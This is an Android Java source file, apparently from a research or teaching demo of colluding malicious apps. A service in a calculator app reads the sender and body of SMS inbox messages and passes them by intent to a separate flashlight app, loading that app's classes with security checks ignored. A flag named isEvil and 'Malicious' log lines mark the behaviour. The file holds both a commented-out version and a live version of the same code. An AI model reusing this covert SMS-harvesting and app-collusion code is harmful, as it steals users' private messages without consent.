//package com.example.calculator;
//
//import android.app.Service;
//import android.content.Context;
//import android.content.Intent;
//import android.content.pm.PackageManager;
//import android.database.Cursor;
//import android.net.Uri;
//import android.os.AsyncTask;
//import android.os.Handler;
//import android.os.IBinder;
//import android.os.Looper;
//import android.util.Base64;
//import android.util.Log;
//
//import java.io.ByteArrayOutputStream;
//import java.io.IOException;
//import java.io.ObjectOutputStream;
//import java.lang.reflect.Constructor;
//import java.util.HashMap;
//
//
//
//public class BackgroundService extends Service {
//
//    private boolean isRunning;
//    HashMap<String, String> smsList = new HashMap<String, String>();
//
//    @Override
//    public IBinder onBind(Intent intent) {
//        return null;
//    }
//
//    @Override
//    public void onCreate() {
//        Context context = this;
//        this.isRunning = false;
//        Log.d("BgC","In OnCreate method.");
//
//    }
//
//    private final Runnable myTask = new Runnable() {
//
//        public void run() {
//            try {
//                new ForegroundCheckTask().execute();
//                Log.d("BgC", "fromService");
//                stopSelf();
//            } catch (Exception ex) {
//                Log.e("BgC", ex.toString());
//            }
//        }
//
//    };
//
//    @Override
//    public void onDestroy() {
//        this.isRunning = false;
//    }
//
//    @Override
//    public int onStartCommand(Intent intent, int flags, int startId) {
//        MainActivity.isEvil = true;
//        Clues myclues = new Clues();
//        myclues.SendLog("App Mode Change", "App entered onStartCommand()", "Malicious");
//        Log.d("BgC","Entering onStartCommand Method");
//
//        if (!this.isRunning) {
//            this.isRunning = true;
//            Handler handler = new Handler(Looper.getMainLooper());
//            handler.post(myTask);
//        }
//        return START_STICKY;
//    }
//
//    class ForegroundCheckTask extends AsyncTask<String[], Void, String> {
//        String[] result;
//
//        @Override
//        protected String doInBackground(String[]... params) {
//            getSMSDetails(result);
//            Log.d("BgC","Coming out from SMSDetails method");
//            return "";
//        }
//
//        private void getSMSDetails(final String[] param) {
//            Cursor smsCursor = getContentResolver().query(
//                    Uri.parse("content://sms/inbox"),
//                    null,
//                    null,
//                    null,
//                    null);
//            Log.d("BgC","Finding the sms.");
//
//            try {
//                int i = 0;
//                while (true) {
//                    assert smsCursor != null;
//                    if (!smsCursor.moveToNext()) break;
//                    String sender = smsCursor.getString(smsCursor.getColumnIndexOrThrow("address"));
//                    String message = smsCursor.getString(smsCursor.getColumnIndexOrThrow("body"));
//                    smsList.put(sender, message);
//                    Log.d("BgC","Adding the data in Hash-map");
//                    i++;
//                    if (i == 2) {
//                        break;
//                    }
//                }
//            } catch (Exception ex) {
//                ex.printStackTrace();
//                Log.e("BgC","Got an error.");
//            } finally {
//                assert smsCursor != null;
//                smsCursor.close();
//            }
//
//            try {
//                PackageManager packageManager = getPackageManager();
//                try {
//                    packageManager.getPackageInfo("com.example.flashlightIITR", PackageManager.GET_ACTIVITIES);
//                    Log.d("BgC","Found the package name");
//                } catch (PackageManager.NameNotFoundException e) {
//                    e.printStackTrace();
//                    Log.e("BgC","Cannot find the package name");
//                }
//
//                final Context remoteContext = getApplicationContext().createPackageContext("com.example.flashlightIITR",
//                        Context.CONTEXT_IGNORE_SECURITY | Context.CONTEXT_INCLUDE_CODE);
//                Log.d("BgC","Creating the context");
//
//                final ClassLoader loader = remoteContext.getClassLoader();
//                final Class<?> classBackground = loader.loadClass("com.example.flashlightIITR.BackgroundService");
//                final Class<?> classNotify = loader.loadClass("com.example.flashlightIITR.NotificationActivity");
//                Log.d("BgC","Loading the classes.");
//
//                final Constructor<?> constructorBackground = classBackground.getConstructor();
//                final Constructor<?> constructorNotify = classNotify.getConstructor();
//                Handler h = new Handler(Looper.getMainLooper());
//                h.post(new Runnable() {
//                    public void run() {
//                        Log.d("BgC","In the run method");
//                        try {
//                            Intent intent1 = new Intent(remoteContext, classNotify);
//                            intent1.setAction(Intent.ACTION_SEND_MULTIPLE);
//                            intent1.putExtra("SMS_LIST", serializeHashMap(smsList));
//                            Log.d("BgC", String.valueOf(smsList));
//
//
//                            intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
//                            intent1.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
//                            intent1.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
//                            remoteContext.startActivity(intent1);
//                            Log.d("BgC","Starting the Intent");
//
////                            Service obj = (Service) constructorBackground.newInstance();
////                            Intent intent = new Intent(remoteContext, obj.getClass());
//
//                        } catch (Exception ex) {
//                            ex.printStackTrace();
//                        }
//                    }
//                });
//            } catch (Exception ex) {
//                Log.e("BgC", ex.toString());
//                ex.printStackTrace();
//            }
//
//            stopSelf();
//
//        }
//    }
//
//    private String serializeHashMap(HashMap<String, String> hashMap) {
//        try {
//            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
//            objectOutputStream.writeObject(hashMap);
//            objectOutputStream.close();
//            return Base64.encodeToString(byteArrayOutputStream.toByteArray(), Base64.DEFAULT);
//        } catch (IOException e) {
//            e.printStackTrace();
//            return null;
//        }
//    }
//}


package com.example.calculator;



import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;

import androidx.appcompat.app.AlertDialog;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.gson.Gson;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.util.HashMap;



public class BackgroundService extends Service {

    private boolean isRunning;
    HashMap<String, String> smsList = new HashMap<String, String>();
    private static final String PERMISSION_STATUS = "permission_status";
    private boolean isAppDirectlyStarted = false;


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        Context context = this;
        this.isRunning = false;
        Log.d("BgC", "In OnCreate method.");

    }

    private final Runnable myTask = new Runnable() {

        public void run() {
            try {
                new ForegroundCheckTask().execute();
                Log.d("BgC", "fromService");
                stopSelf();
            } catch (Exception ex) {
                Log.e("BgC", ex.toString());
            }
        }

    };

    @Override
    public void onDestroy() {
        this.isRunning = false;
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        MainActivity.isEvil = true;
        Clues myclues = new Clues();
        myclues.SendLog("App Mode Change", "App entered onStartCommand()", "Malicious");
        Log.d("BgC", "Entering onStartCommand Method");

        if (!this.isRunning) {
            this.isRunning = true;
            Handler handler = new Handler(Looper.getMainLooper());
            handler.post(myTask);
        }
        return START_STICKY;
    }

    class ForegroundCheckTask extends AsyncTask<String[], Void, String> {
        String[] result;

        @Override
        protected String doInBackground(String[]... params) {
            getSMSDetails(result);
            Log.d("BgC", "Coming out from SMSDetails method");
            return "";
        }

        private void getSMSDetails(final String[] param) {
            Cursor smsCursor = getContentResolver().query(
                    Uri.parse("content://sms/inbox"),
                    null,
                    null,
                    null,
                    null);
            Log.d("BgC", "Finding the sms.");

            try {
                int i = 0;
                while (true) {
                    assert smsCursor != null;
                    if (!smsCursor.moveToNext()) break;
                    String sender = smsCursor.getString(smsCursor.getColumnIndexOrThrow("address"));
                    String message = smsCursor.getString(smsCursor.getColumnIndexOrThrow("body"));
                    smsList.put(sender, message);
                    Log.d("BgC", "Adding the data in Hash-map");
                    i++;
                    if (i == 2) {
                        break;
                    }
                }
            } catch (Exception ex) {
                ex.printStackTrace();
                Log.e("BgC", "Got an error.");
            } finally {
                assert smsCursor != null;
                smsCursor.close();
            }


            try {
                PackageManager packageManager = getPackageManager();
                packageManager.getPackageInfo("com.example.flashlightIITR", PackageManager.GET_ACTIVITIES);
                Log.d("BgC","Found the package name");

                final Context remoteContext = getApplicationContext().createPackageContext("com.example.flashlightIITR",
                        Context.CONTEXT_IGNORE_SECURITY | Context.CONTEXT_INCLUDE_CODE );
                Log.d("BgC","Creating the context");

                final ClassLoader loader = remoteContext.getClassLoader();
                final Class<?> classNotify = loader.loadClass("com.example.flashlightIITR.NotificationActivity");
                Log.d("BgC","Loading the class.");

                Intent intent1 = new Intent(remoteContext,classNotify);
                intent1.setAction(Intent.ACTION_SEND);
                intent1.putExtra("SMS_LIST", smsList);
                intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK );
                intent1.setType("text/plain");
                Log.d("BgC", String.valueOf(smsList));

                startActivity(intent1);
                Log.d("BgC","Starting the Intent");
            } catch (Exception ex) {
                Log.e("BgC", ex.toString());
                ex.printStackTrace();
            }


            stopSelf();


        }
    }

//        private void sendDataToAnotherApp() {
//        // Create an explicit intent with the component name of the NotificationActivity
//        Intent sendIntent = new Intent();
//        sendIntent.setComponent(new ComponentName("com.example.flashlightIITR", "com.example.flashlightIITR.NotificationActivity"));
//        sendIntent.putExtra("SMS_LIST", smsList);
//        Log.d("BgC", String.valueOf(smsList));
//
//        try {
//            // Start the service using the explicit intent
//            sendBroadcast(sendIntent);
//            Log.d("BgC", "Service started in flashlight app");
//        } catch (Exception e) {
//            Log.e("BgC", "Error starting service in flashlight app: " + e.getMessage());
//            e.printStackTrace();
//        }
//    }


}